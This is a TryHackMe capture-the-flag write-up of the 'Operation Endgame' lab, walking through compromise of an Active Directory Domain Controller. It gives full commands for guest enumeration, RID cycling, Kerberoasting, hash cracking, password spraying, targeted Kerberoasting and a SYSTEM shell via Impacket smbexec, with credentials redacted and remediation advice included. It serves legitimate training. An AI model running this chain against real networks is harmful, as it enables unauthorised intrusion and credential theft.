# Operation Endgame Challenge

![Banner](./../IMAGES/operation_endgame_img.png?raw=true)

**Category:** *Standalone Challenge* | **Section:** *TryHackMe Challenges* | **Challenge:** *[Operation Endgame](https://tryhackme.com/room/operationendgame)*

> [!IMPORTANT]
>
> **Working write-up notice:** This was a working and verified write-up at the time of writing on **27 July 2026**.
>
> **Spoiler warning:** This write-up documents the full attack chain. Credentials, account names, hashes, challenge-specific directory values and the exact flag have been redacted.
>
> **Please note:** The target IP address was dynamically allocated by TryHackMe. The assessment was performed from my own Kali Linux VM using the TryHackMe VPN.
>
> The following placeholders are used throughout:
>
> - `<TARGET_IP>` represents the IP address allocated to the target machine.
> - `<TUN0_IP>` represents the IP address assigned to the Kali Linux `tun0` interface.
> - `<REDACTED>` represents credentials, account names, hashes, domain values, sensitive file contents and other direct challenge giveaways.
> - `THM{....}` represents the redacted TryHackMe flag.
>
> **Licence:** Unless otherwise stated, all write-ups and documentation in this repository are licensed under [CC BY 4.0](https://creativecommons.org/licenses/by/4.0/). Any original scripts or code snippets are provided under the [MIT Licence](https://opensource.org/license/mit/).

## About TryHackMe

This write-up was made possible by the work of the TryHackMe team and the wider cyber security community, who continue to create practical environments for developing offensive and defensive security skills.

[TryHackMe](https://tryhackme.com/) is an online cyber security training platform that provides hands-on laboratories covering penetration testing, networking, web application security, privilege escalation, Active Directory and defensive security.

Operation Endgame is a controlled Active Directory challenge. Every action documented below was performed against the authorised room target supplied by TryHackMe.

## Lab Summary

Operation Endgame focused on compromising a Windows Active Directory environment through a chain of weaknesses rather than a single exploit.

The successful route involved:

1. Confirming VPN routing and local hostname resolution.
2. Identifying the target as a Domain Controller.
3. Using Guest access to enumerate SMB shares and domain users.
4. Kerberoasting a service account and cracking its password.
5. Identifying password reuse across another domain account.
6. Performing targeted Kerberoasting against a user controlled through delegated Active Directory permissions.
7. Cracking the second Kerberos service-ticket hash.
8. Using Remote Desktop access to inspect the compromised user's environment.
9. Finding a PowerShell automation script containing plaintext credentials.
10. Confirming that the exposed account had administrative access.
11. Obtaining a remote `NT AUTHORITY\SYSTEM` shell.
12. Reading the final flag from the Administrator desktop.

Confirmed lab details:

```text
Target IP: <TARGET_IP>
Kali tun0 IP: <TUN0_IP>
Attacker working directory: /tmp/VK/
Local hostname: endgame.thm
```

The initial hostname mapping was added with:

```bash
echo "<TARGET_IP> endgame.thm" | sudo tee -a /etc/hosts
```

The mapping was confirmed with:

```bash
getent hosts endgame.thm
```

VPN routing and the tunnel address were also verified:

```bash
ip route get <TARGET_IP>
ip -br address show tun0
```

The expected result showed traffic leaving through `tun0` and using `<TUN0_IP>` as the source address:

```text
<TARGET_IP> via <REDACTED> dev tun0 src <TUN0_IP>
```

This confirmed that traffic to the target was routed through `tun0` using `<TUN0_IP>`.

> [!TIP]
>
> When using your own Kali Linux VM, `/etc/hosts` is especially important during TryHackMe challenges. Some rooms rely on hostname-based routing, redirects, TLS certificates, Kerberos service names, virtual hosts or application logic that will not behave correctly when the expected hostname is missing.
>
> Over time, `/etc/hosts` can become clogged with entries from previous rooms. It is advantageous to keep the file clear, tidy and limited to the challenge currently being worked on.
>
> A crowded hosts file eventually becomes DNS spaghetti - still technically edible, but nobody should trust it.

The file can be reviewed with:

```bash
cat /etc/hosts
```

An old entry for this room can be removed with:

```bash
sudo sed -i '/endgame\.thm/d' /etc/hosts
```

The currently allocated address can then be added again using `<TARGET_IP>`.

## Tools Used

The principal tools and utilities used during the challenge were:

- `ip`, `getent` and `ping` for VPN routing, interface and hostname validation.
- Nmap and RustScan for port discovery, service detection and default script enumeration.
- NetExec (`nxc`) for SMB and LDAP authentication, share enumeration, RID cycling, Kerberoasting and password spraying.
- `grep`, `cut`, `cat` and `wc` for processing enumeration output and extracted hashes.
- John the Ripper for offline cracking of Kerberos TGS hashes.
- `targetedKerberoast.py` for targeted Kerberoasting through delegated Active Directory write permissions.
- FreeRDP (`xfreerdp3`) for Remote Desktop access.
- Windows Command Prompt and PowerShell for local post-exploitation inspection.
- Impacket `psexec`, `wmiexec` and `smbexec` for testing remote administrative execution methods.

Click [HERE](https://github.com/Valikahn/TryHackMe-Standalone-Challenge#tools-commonly-used) to return to the repository README. The `Tools Commonly Used` section contains links to tools used throughout the pathway.

## Initial Enumeration

### Port and Service Discovery

A standard Nmap service scan was performed:

```bash
nmap -sC -sV -Pn endgame.thm
```

RustScan was also used for faster discovery:

```bash
rustscan -b 500 -a endgame.thm --top -- -sC -sV -Pn
```

A complete TCP scan confirmed the exposed attack surface:

```bash
nmap -Pn -p- -sC -sV --min-rate 2000 endgame.thm
```

The principal services identified were:

```text
53/tcp     DNS
80/tcp     Microsoft IIS
88/tcp     Kerberos
135/tcp    Microsoft RPC
139/tcp    NetBIOS
389/tcp    LDAP
443/tcp    HTTPS
445/tcp    SMB
464/tcp    Kerberos password change
593/tcp    RPC over HTTP
636/tcp    LDAPS
3268/tcp   Global Catalog LDAP
3269/tcp   Global Catalog LDAPS
3389/tcp   RDP
9389/tcp   Active Directory Web Services
47001/tcp  Microsoft HTTPAPI
Dynamic high ports for RPC
```

LDAP and RDP metadata confirmed that the host was a Windows Server Domain Controller. The discovered Active Directory domain and computer names are intentionally redacted:

```text
Domain: <REDACTED>
Domain Controller: <REDACTED>
Operating system build: Windows Server 2019 / Build 17763
SMB signing: enabled and required
```

The discovered Domain Controller names were added alongside `endgame.thm` in `/etc/hosts` so that LDAP, Kerberos, SMB and RDP could resolve the expected hostnames:

```text
<TARGET_IP> endgame.thm <REDACTED> <REDACTED> <REDACTED>
```

### Guest SMB Access

Guest authentication was tested against SMB:

```bash
nxc smb endgame.thm -u 'guest' -p '' --shares
```

The target accepted the Guest account:

```text
[+] <REDACTED>\guest:
```

The accessible shares were standard Windows and Active Directory shares. Guest had read access to IPC communication, although the administrative shares remained inaccessible:

```text
ADMIN$
C$
IPC$
NETLOGON
SYSVOL
```

This was an important foothold because Guest access allowed further domain enumeration without possessing a normal user's password.

### RID Cycling and Username Discovery

NetExec RID cycling was used to enumerate domain security principals:

```bash
nxc smb endgame.thm -u 'guest' -p '' --rid > rid_brute.txt
```

User account names were extracted from the output:

```bash
cat rid_brute.txt \
  | grep "SidTypeUser" \
  | cut -d'\' -f2 \
  | cut -d' ' -f1 \
  > usernames.txt
```

The resulting list contained hundreds of domain accounts:

```bash
wc -l usernames.txt
head usernames.txt
```

Account names are intentionally omitted because they are direct challenge giveaways:

```text
Administrator
Guest
krbtgt
<REDACTED>
<REDACTED>
...
```

### Generating Host Entries

NetExec was used to produce a suitable hosts-file entry:

```bash
nxc smb endgame.thm \
  -u 'guest' \
  -p '' \
  --generate-hosts-file hosts
```

The generated entry confirmed the Domain Controller's DNS and NetBIOS names:

```text
<TARGET_IP> <REDACTED> <REDACTED> <REDACTED>
```

These values were added to `/etc/hosts` while retaining the local challenge hostname `endgame.thm`.

## Exploits

### Guest-Authenticated Kerberoasting

LDAP accepted the Guest account, which allowed the directory to be searched for accounts with Service Principal Names:

```bash
nxc ldap <REDACTED> \
  -u 'guest' \
  -p '' \
  --kerberoasting kerberoastables.txt
```

One Kerberoastable account was returned:

```text
sAMAccountName: <REDACTED>
memberOf: Remote Desktop Users
$krb5tgs$23$*<REDACTED>$<REDACTED>$...
```

The complete hash was stored in:

```text
/tmp/VK/kerberoastables.txt
```

This was a Kerberos 5 TGS etype 23 hash, meaning it could be cracked offline without repeatedly authenticating to the Domain Controller.

### Cracking the First Kerberos TGS Hash

John the Ripper was used with the `rockyou.txt` wordlist:

```bash
john kerberoastables.txt \
  --wordlist=/usr/share/wordlists/rockyou.txt
```

The password was recovered almost immediately:

```text
<REDACTED> (?)
```

The credential pair is intentionally withheld:

```text
<REDACTED>:<REDACTED>
```

The password was validated against SMB:

```bash
nxc smb <REDACTED> \
  -u '<REDACTED>' \
  -p '<REDACTED>'
```

The successful response confirmed that the cracked password was valid:

```text
[+] <REDACTED>\<REDACTED>:<REDACTED>
```

### Password Reuse and Domain Password Spraying

The recovered password was tested against the enumerated usernames:

```bash
nxc smb <REDACTED> \
  -u usernames.txt \
  -p '<REDACTED>' \
  --continue-on-success
```

Two accounts authenticated successfully with the same password:

```text
[+] <REDACTED>\<REDACTED>:<REDACTED>
[+] <REDACTED>\<REDACTED>:<REDACTED>
```

One was the original Kerberoasted user. The other was a separate domain account, confirming password reuse.

> [!NOTE]  
> Password spraying must be performed carefully. In a real environment it can trigger account lockouts, monitoring alerts and operational disruption. This test was conducted only within the authorised TryHackMe room.

### Targeted Kerberoasting  
> Kerberoasting is a post-exploitation attack technique targeting the Kerberos authentication protocol, enabling adversaries to extract encrypted service account credentials from Active Directory. Please visit [CrowdStrike](https://www.crowdstrike.com/en-us/cybersecurity-101/cyberattacks/kerberoasting/) or [SentinelOne](https://www.sentinelone.com/cybersecurity-101/threat-intelligence/what-is-kerberoasting-attack/) for a fantastic writeup and explanation on this exploit. 

Returning to the Challenge Lab! So, the newly compromised account had delegated Active Directory permissions that could be abused against another user. The `targetedKerberoast` project was obtained when the command was not already available:

```bash
git clone https://github.com/ShutdownRepo/targetedKerberoast.git
```

> [targetedKerberoast by ShutdownRepo](https://github.com/ShutdownRepo/targetedKerberoast) is a Python script that can, like many others (e.g. GetUserSPNs.py), print "kerberoast" hashes for user accounts that have a SPN set. This tool brings the following additional feature: for each user without SPNs, it tries to set one (abuse of a write permission on the servicePrincipalName attribute), print the "kerberoast" hash, and delete the temporary SPN set for that operation. This is called targeted Kerberoasting. This tool can be used against all users of a domain, or supplied in a list, or one user supplied in the CLI.

The targeted Kerberoast attack was executed as follows:

```bash
./targetedKerberoast/targetedKerberoast.py \
  -v \
  -d '<REDACTED>' \
  -u '<REDACTED>' \
  -p '<REDACTED>' \
  --dc-host <REDACTED> \
  --request-user '<REDACTED>' \
  > jerri_lancaster.txt
```

The tool:

1. Added a temporary SPN to the target user.
2. Requested a Kerberos service ticket for that account.
3. Printed the resulting TGS hash.
4. Removed the temporary SPN.

The output confirmed clean SPN removal:

```text
[*] Attacking user (<REDACTED>)
[VERBOSE] SPN added successfully
[+] Printing hash for (<REDACTED>)
$krb5tgs$23$*<REDACTED>$...
[VERBOSE] SPN removed successfully
```

The hash line was extracted into a clean file:

```bash
grep '^\$krb5tgs\$' \
  jerri_lancaster.txt \
  > jerri_hash.txt
```

The extraction was verified:

```bash
wc -l jerri_hash.txt
```

Expected result:

```text
1 jerri_hash.txt
```

### Cracking the Targeted Kerberoast Hash

The second TGS hash was cracked with John:

```bash
john jerri_hash.txt \
  --wordlist=/usr/share/wordlists/rockyou.txt
```

John recovered the password:

```text
<REDACTED> (?)
```

The credential pair is intentionally omitted:

```text
<REDACTED>:<REDACTED>
```

The credential was validated over SMB:

```bash
nxc smb <REDACTED> \
  -u '<REDACTED>' \
  -p '<REDACTED>'
```

The successful authentication confirmed that the account was compromised:

```text
[+] <REDACTED>\<REDACTED>:<REDACTED>
```

### Remote Desktop Access

The targeted account had Remote Desktop access. An RDP session was opened with FreeRDP:

```bash
xfreerdp3 \
  /v:<REDACTED> \
  /u:'<REDACTED>\<REDACTED>' \
  /p:'<REDACTED>' \
  /dynamic-resolution \
  /clipboard \
  /cert:ignore
```

The login succeeded, although Windows displayed a temporary-profile warning. File Explorer also failed to initialise properly because the profile had not been created normally.

Instead of relying on Explorer, Command Prompt was opened through the Run dialogue:

```text
Windows key + R
cmd
```

The account's privileges were checked:

```cmd
whoami /priv
```

Only ordinary privileges were present:

```text
SeMachineAccountPrivilege
SeChangeNotifyPrivilege
SeIncreaseWorkingSetPrivilege
```

There was no direct privilege such as `SeBackupPrivilege` or `SeImpersonatePrivilege` available in that user's interactive session.

> [!NOTE]
>
> When FreeRDP becomes trapped in full-screen mode inside VMware Workstation, `Ctrl + Alt + Enter` normally toggles full screen. Some FreeRDP builds use `Ctrl + Alt + F`. In this instance, logging off the Windows session was the most reliable way to regain control.

### Discovering a Credential-Bearing PowerShell Script

The root of the system drive contained a scripts directory:

```cmd
dir C:\Scripts
```

One PowerShell script was present:

```text
syncer.ps1
```

Its contents were read with:

```cmd
type C:\Scripts\syncer.ps1
```

The script imported the Active Directory module and created a `PSCredential` object from hard-coded plaintext values:

```powershell
Import-Module ActiveDirectory

$Username = "<REDACTED>"
$Password = ConvertTo-SecureString "<REDACTED>" -AsPlainText -Force
$Credential = New-Object System.Management.Automation.PSCredential(
    $Username,
    $Password
)

Sync-ADObject \
  -Object "<REDACTED>" \
  -Source "<REDACTED>" \
  -Destination "<REDACTED>" \
  -Credential $Credential
```

No decoding was required during this challenge. The credential was stored directly in plaintext and converted into a PowerShell secure string only at runtime. `ConvertTo-SecureString -AsPlainText -Force` did not protect the password inside the script file.

### Validating Administrative Access

The exposed credential was tested over SMB:

```bash
nxc smb <REDACTED> \
  -u '<REDACTED>' \
  -p '<REDACTED>'
```

NetExec returned:

```text
[+] <REDACTED>\<REDACTED>:<REDACTED> (Pwn3d!)
```

The `(Pwn3d!)` marker confirmed that the account had local administrative rights on the Domain Controller.

### Remote Administrative Execution

Several Impacket execution methods were tested.

#### PsExec Attempt

```bash
impacket-psexec \
  '<REDACTED>/<REDACTED>:<REDACTED>@<REDACTED>'
```

Authentication succeeded, the ADMIN$ share was writable and a temporary executable was uploaded. However, the service failed to return an interactive shell and cleanup reported an error:

```text
[*] Found writable share ADMIN$
[*] Uploading file <REDACTED>.exe
[*] Creating service <REDACTED>
[*] Starting service <REDACTED>
[-] Error performing the uninstallation, cleaning up
```

#### WMIExec Attempt

```bash
impacket-wmiexec \
  '<REDACTED>/<REDACTED>:<REDACTED>@<REDACTED>'
```

WMI denied remote execution:

```text
WMI SessionError: code: 0x80070005
E_ACCESSDENIED
```

This demonstrated that valid administrative credentials do not guarantee that every remote management protocol will be available.

#### SMBExec Success

SMBExec provided the working administrative shell:

```bash
impacket-smbexec \
  '<REDACTED>/<REDACTED>:<REDACTED>@<REDACTED>'
```

The resulting shell operated as `NT AUTHORITY\SYSTEM`:

```text
C:\Windows\system32>
```

The effective privileges were checked:

```cmd
whoami /priv
```

The output included highly privileged capabilities such as:

```text
SeTcbPrivilege
SeDebugPrivilege
SeImpersonatePrivilege
SeCreateGlobalPrivilege
SeDelegateSessionUserImpersonatePrivilege
```

This confirmed full local system-level execution.

### Flag Discovery

The Administrator desktop was listed:

```cmd
dir C:\Users\Administrator\Desktop
```

The flag file used a duplicated `.txt` extension:

```text
flag.txt.txt
```

It was read with:

```cmd
type C:\Users\Administrator\Desktop\flag.txt.txt
```

The challenge answer was discovered at this final stage:

```text
THM{....}
```

The exact flag is intentionally redacted from the public write-up.

## Full Attack Chain Recap

### 1. VPN and Hostname Preparation
The target address and `tun0` interface were confirmed before enumeration. `endgame.thm` was mapped to `<TARGET_IP>` in `/etc/hosts`, ensuring stable name resolution from the attack VM.

### 2. Active Directory Service Discovery
Nmap and RustScan identified DNS, Kerberos, LDAP, SMB, RDP, Active Directory Web Services and Windows RPC services. LDAP and RDP metadata confirmed that the host was a Domain Controller.

### 3. Guest Access
SMB and LDAP accepted the Guest account with an empty password. Although share access was limited, Guest authentication was enough to enumerate domain users and query Kerberoastable accounts.

### 4. RID-Based User Enumeration
NetExec RID cycling returned a large set of valid domain users. The account list was extracted into `usernames.txt` for subsequent authentication and Kerberos testing.

### 5. Initial Kerberoasting
Guest-authenticated LDAP enumeration identified one account with an SPN. A Kerberos TGS etype 23 hash was requested and stored locally.

### 6. First Password Recovery
John the Ripper cracked the first TGS hash using `rockyou.txt`. The recovered credential was validated successfully over SMB.

### 7. Password Reuse
The recovered password was sprayed across the enumerated username list. A second domain account reused the same password, expanding access without requiring another hash crack.

### 8. Targeted Kerberoasting
The second compromised account had delegated write permissions over another user. `targetedKerberoast.py` temporarily added an SPN, requested the target user's service ticket and removed the SPN cleanly.

### 9. Second Password Recovery
The targeted user's TGS hash was extracted and cracked with John. The recovered password provided valid SMB and RDP access.

### 10. RDP Post-Exploitation
The compromised user logged on through RDP. A temporary-profile issue prevented normal Explorer use, so Command Prompt was used for local enumeration.

### 11. Plaintext Credential Discovery
`C:\Scripts\syncer.ps1` contained a hard-coded username and plaintext password for an automation account. The script converted the password into a `SecureString`, but the original secret remained plainly visible in the file.

### 12. Administrative Credential Validation
NetExec reported `(Pwn3d!)` for the exposed account, confirming local administrator access on the Domain Controller.

### 13. Remote SYSTEM Shell
`psexec` and `wmiexec` were unsuccessful for different reasons. `smbexec` succeeded and returned a shell running as `NT AUTHORITY\SYSTEM`.

### 14. Final Flag
The Administrator desktop contained `flag.txt.txt`. Reading the file returned:

```text
THM{....}
```

This completed Operation Endgame.

## Key Lessons

Operation Endgame demonstrated several important penetration-testing and defensive-security lessons:

- Validate VPN routing, `tun0` and hostname resolution before troubleshooting higher-level services.
- Keep `/etc/hosts` tidy when using a personal Kali Linux VM for TryHackMe rooms.
- Active Directory service metadata can reveal the domain, Domain Controller name and operating system build.
- Guest accounts should not be assumed harmless; limited authentication may still permit LDAP queries, RID cycling and Kerberos abuse.
- SMB signing prevents some relay attacks but does not compensate for exposed accounts, weak passwords or excessive permissions.
- Kerberoastable accounts require long, unique and preferably managed passwords.
- Password reuse can convert one cracked account into several compromised identities.
- Delegated Active Directory permissions can be as dangerous as direct group membership.
- Targeted Kerberoasting can turn write access over an account into an offline password-cracking opportunity.
- A PowerShell `SecureString` does not protect a password that is stored in plaintext in the source script.
- Automation accounts frequently become high-value targets because their credentials are embedded in scripts, services or scheduled tasks.
- Administrative credentials may work through one remote execution technique while another protocol is denied.
- Testing several legitimate administration paths is often more effective than assuming one tool must work.
- File enumeration matters: the final flag used the unexpected filename `flag.txt.txt`.
- Public write-ups should preserve methodology while withholding live credentials, hashes, account names and exact flags.

The central lesson was that the Domain Controller fell through accumulation. Guest access enabled enumeration, a weak service password enabled Kerberoasting, password reuse expanded access, delegated permissions enabled targeted Kerberoasting, and a plaintext automation credential delivered administrative control.

## Remediation Notes

### Guest and Anonymous Access

- Disable the Guest account unless there is a documented operational requirement.
- Prevent Guest and anonymous users from querying LDAP or enumerating domain SIDs.
- Restrict null-session and anonymous access to named pipes and IPC resources.
- Audit systems for `Null Auth` exposure.
- Monitor RID cycling and large volumes of SID lookups.

### Kerberos Service Accounts

- Use long, randomly generated passwords for all accounts with SPNs.
- Prefer Group Managed Service Accounts where supported.
- Rotate service-account passwords regularly.
- Restrict service accounts from interactive logon unless it is required.
- Monitor unusual TGS request volumes and RC4-based service-ticket activity.
- Disable RC4 Kerberos encryption where compatibility allows.
- Review SPNs regularly and remove stale registrations.

### Password Policy and Reuse

- Enforce unique passwords across user, service and administrative accounts.
- Block known breached and commonly used passwords.
- Use sufficiently long passphrases rather than relying only on complexity rules.
- Monitor password spraying and repeated authentication attempts across many accounts.
- Apply account lockout controls carefully to avoid creating denial-of-service opportunities.
- Rotate all credentials involved in a suspected compromise.

### Delegated Active Directory Permissions

- Review `GenericWrite`, `GenericAll`, `WriteProperty`, `WriteDACL` and ownership rights.
- Remove unnecessary user-to-user write permissions.
- Use dedicated administrative groups for approved delegation.
- Audit changes to `servicePrincipalName`.
- Alert when an SPN is added and removed from an ordinary user account in a short period.
- Periodically review ACL inheritance throughout the directory.

### Remote Desktop Security

- Restrict RDP to approved management networks and jump hosts.
- Require Network Level Authentication.
- Use multi-factor authentication where supported.
- Prevent ordinary service and automation accounts from receiving RDP rights.
- Monitor unusual RDP logons to Domain Controllers.
- Deny interactive logon to accounts that do not require desktop access.

### Script and Credential Security

- Never embed plaintext passwords in PowerShell scripts.
- Do not rely on `ConvertTo-SecureString -AsPlainText -Force` as a storage control.
- Store secrets in an approved secrets-management platform.
- Use managed identities, gMSAs or certificate-based authentication where possible.
- Restrict read permissions on automation and deployment directories.
- Scan repositories, scripts and scheduled tasks for exposed credentials.
- Rotate credentials immediately when plaintext secrets are discovered.

### Administrative Access

- Do not use highly privileged accounts for routine automation.
- Separate service, automation, workstation administration and Domain Controller administration identities.
- Apply the principle of least privilege.
- Use Privileged Access Workstations for sensitive administration.
- Restrict SMB service-control access to approved management systems.
- Monitor remote service creation and deletion.
- Alert on unexpected use of ADMIN$ and remote execution frameworks.

### Monitoring and Detection

- Collect Kerberos, LDAP, SMB, RDP and service-control logs centrally.
- Detect Guest authentication followed by directory enumeration.
- Alert on large RID-cycling patterns.
- Detect TGS requests for many accounts or unusual SPN changes.
- Monitor authentication successes after broad password failures.
- Investigate remote service creation, WMI execution attempts and SMB-based shells.
- Monitor access to `C:\Scripts`, scheduled-task definitions and automation credentials.

### Operational Hygiene

- Keep `/etc/hosts` limited to mappings required for the current room.
- Remove stale TryHackMe entries after completing each challenge.
- Record the target IP, hostname and `tun0` address before starting.
- Use a separate working directory such as `/tmp/VK/` for each engagement.
- Save scan output, user lists and hashes with descriptive filenames.
- Validate each credential before building the next stage of the attack chain.
- Redact IP addresses, credentials, hashes, usernames and flags before publishing.

## Disclaimer

This writeup is intended solely for education, training and documentation of an authorised TryHackMe lab.

All tools, commands, payloads and post-exploitation techniques described here were used within a controlled environment provided by TryHackMe. Permission to interact with the target was granted by the platform owner and operator as part of the room.

The tools and methods documented in this walkthrough represent one successful approach. They are not the only possible techniques, and alternative tools or workflows may produce the same result.

Never test, scan, exploit or access a system without clear and explicit authorisation from its owner.

---
[!["Buy Me A Coffee"](https://www.buymeacoffee.com/assets/img/custom_images/orange_img.png)](https://buymeacoffee.com/v4l1k4hn)  

**Powered on ☕ made with ❤️ by [V4L1K4HN](https://tryhackme.com/p/V4L1K4HN)**  
⭐ If this project is useful, consider starring it on GitHub.
